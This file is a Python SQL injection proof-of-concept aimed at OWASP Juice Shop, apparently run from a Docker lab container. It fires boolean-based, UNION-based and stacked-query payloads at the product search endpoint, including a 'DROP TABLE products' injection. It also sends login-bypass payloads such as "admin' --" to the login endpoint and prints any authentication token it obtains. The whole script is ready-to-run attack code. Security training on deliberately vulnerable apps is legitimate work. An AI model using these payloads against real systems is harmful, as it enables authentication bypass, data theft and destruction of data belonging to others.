import requests
import sys
import json
from colorama import Fore, init

init(autoreset=True)

TARGET = "http://juice-shop:3000"
SEARCH_ENDPOINT = f"{TARGET}/rest/products/search"

def print_header():
    """Print header"""
    print(f"\n{Fore.CYAN}{'='*80}")
    print(f"{Fore.CYAN}SQL Injection (CWE-89) PoC for OWASP Juice Shop")
    print(f"{Fore.CYAN}{'='*80}")
    print(f"\n{Fore.YELLOW}Target endpoint: {SEARCH_ENDPOINT}")
    print(f"{Fore.YELLOW}Environment: Docker Virtual Environment (Attacker Container)")
    print(f"{Fore.YELLOW}Date: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def check_service_health():
    """Check if Juice Shop is available"""
    print(f"\n{Fore.CYAN}[*] Checking Juice Shop availability...")
    try:
        response = requests.get(f"{TARGET}/", timeout=5)
        if response.status_code == 200:
            print(f"{Fore.GREEN}✓ Juice Shop is up and running!")
            return True
    except Exception as e:
        print(f"{Fore.RED}✗ Connection error: {e}")
        print(f"{Fore.RED}Make sure Juice Shop is running:  docker compose up -d juice-shop")
        return False

def test_normal_search():
    """Baseline search without injection (for comparison)"""
    print(f"\n{Fore.YELLOW}[1] Baseline search (no SQL injection)")
    print(f"{Fore.YELLOW}{'-'*80}")
    
    try:
        params = {"q": "Juice"}
        response = requests.get(SEARCH_ENDPOINT, params=params, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            products = data.get('data', [])
            baseline_count = len(products)
            
            print(f"Request:  GET {SEARCH_ENDPOINT}?q=Juice")
            print(f"HTTP Status: {response.status_code}")
            print(f"Products found: {baseline_count}")
            
            if products:
                print(f"\nSample products:")
                for product in products[:3]: 
                    print(f"  - {product.get('name', 'Unknown')}")
            
            return baseline_count
        else:
            print(f"{Fore.RED}Error: HTTP {response.status_code}")
            return 0
    
    except Exception as e:
        print(f"{Fore.RED}Request error: {e}")
        return 0

def test_sqli_payloads(baseline_count):
    """Test SQL Injection payloads"""
    print(f"\n{Fore.YELLOW}[2] Testing SQL Injection Payloads")
    print(f"{Fore.YELLOW}{'-'*80}")
    
    payloads = [
        {
            "payload": "' OR '1'='1",
            "description": "Classic SQLi - OR condition always true",
            "type": "Boolean-based"
        },
        {
            "payload": "' OR 1=1 --",
            "description": "SQLi with SQL comment (--)",
            "type": "Boolean-based"
        },
        {
            "payload": "' UNION ALL SELECT 1,2,3,4,5 --",
            "description": "UNION-based SQL Injection",
            "type": "UNION-based"
        },
        {
            "payload": "'; DROP TABLE products; --",
            "description":  "Destructive injection attempt",
            "type": "Stacked Queries"
        },
    ]
    
    vulnerabilities_found = []
    
    for i, payload_info in enumerate(payloads, 1):
        payload = payload_info["payload"]
        description = payload_info["description"]
        payload_type = payload_info["type"]
        
        print(f"\n{Fore.MAGENTA}[Payload {i}] {payload_type}")
        print(f"{Fore.MAGENTA}Description: {description}")
        print(f"{Fore.MAGENTA}Payload: {payload}")
        
        try:
            params = {"q": payload}
            response = requests.get(SEARCH_ENDPOINT, params=params, timeout=5)
            
            print(f"HTTP Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                products = data.get('data', [])
                sqli_count = len(products)
                
                print(f"Returned products: {sqli_count}")
                
                # Analyze results
                if sqli_count > baseline_count:
                    print(f"{Fore.GREEN}[!!! ] SQL INJECTION WORKS!")
                    print(f"{Fore.GREEN}Got {sqli_count - baseline_count} more results than baseline")
                    
                    if products:
                        print(f"\nSample returned products:")
                        for product in products[:3]:
                            print(f"  - {product.get('name', 'Unknown')}")
                    
                    vulnerabilities_found.append({
                        "payload": payload,
                        "type": payload_type,
                        "results": sqli_count,
                        "exploitable": True
                    })
                elif sqli_count == baseline_count:
                    print(f"{Fore.YELLOW}(Result matches baseline - possible protection)")
                else:
                    print(f"{Fore.YELLOW}(Fewer results - filter may be active)")
            
            elif response.status_code == 400 or response.status_code == 500:
                print(f"{Fore.YELLOW}[! ] Server error - possible vulnerability")
                print(f"Response: {response.text[:200]}")
        
        except requests.exceptions.Timeout:
            print(f"{Fore.RED}[!] Timeout - possible long DB operation")
        
        except Exception as e:
            print(f"{Fore.RED}Error: {e}")
    
    return vulnerabilities_found

def test_sqli_login():
    """Additional test - SQL Injection in login"""
    print(f"\n{Fore.YELLOW}[3] Testing SQL Injection in login endpoint")
    print(f"{Fore.YELLOW}{'-'*80}")
    
    login_endpoint = f"{TARGET}/rest/user/login"
    
    login_payloads = [
        {
            "email": "admin' --",
            "password": "anything",
            "description": "Bypass password using comment"
        },
        {
            "email": "' OR '1'='1",
            "password": "' OR '1'='1",
            "description": "OR condition in both fields"
        },
    ]
    
    print(f"Target endpoint: POST {login_endpoint}\n")
    
    for i, payload_info in enumerate(login_payloads, 1):
        email = payload_info["email"]
        password = payload_info["password"]
        description = payload_info["description"]
        
        print(f"{Fore.MAGENTA}[Attempt {i}] {description}")
        print(f"Email: {email}")
        print(f"Password: {password}")
        
        try:
            data = {"email": email, "password": password}
            response = requests.post(login_endpoint, json=data, timeout=5)
            
            print(f"HTTP Status: {response.status_code}")
            
            if response.status_code == 200:
                resp_data = response.json()
                if resp_data.get('authentication'):
                    print(f"{Fore.GREEN}[!!!] SQL INJECTION IN LOGIN WORKS!")
                    print(f"{Fore.GREEN}Got JWT token: {resp_data.get('authentication')[:50]}...")
                    return True
                else:
                    print(f"Response: {json.dumps(resp_data, indent=2)[:300]}")
            
            print()
        
        except Exception as e:
            print(f"Error: {e}\n")
    
    return False

def generate_report(vulnerabilities_found):
    """Generate report"""
    print(f"\n{Fore.CYAN}{'='*80}")
    print(f"{Fore.CYAN}FINAL REPORT")
    print(f"{Fore.CYAN}{'='*80}\n")
    
    if vulnerabilities_found:
        print(f"{Fore.GREEN}[+] SQL INJECTION (CWE-89) CONFIRMED!")
        
        print(f"Attack vectors found:")
        for vuln in vulnerabilities_found:
            print(f"  ✓ {vuln['type']}")
            print(f"    Payload: {vuln['payload']}")
            print(f"    Results: {vuln['results']} products\n")
        
    else:
        print(f"{Fore.YELLOW}[-] SQL Injection not clearly detected on this endpoint")
        print(f"{Fore.YELLOW}Partial protection may be in place or a patched version is used\n")
    
    print(f"{Fore.CYAN}{'='*80}\n")

def main():
    """Main function"""
    print_header()
    
    # Check service availability
    if not check_service_health():
        sys.exit(1)
    
    # Baseline search
    baseline = test_normal_search()
    
    # Test SQL Injection payloads
    vulnerabilities = test_sqli_payloads(baseline)
    
    # Test login
    test_sqli_login()
    
    # Report
    generate_report(vulnerabilities)

if __name__ == "__main__":
    main()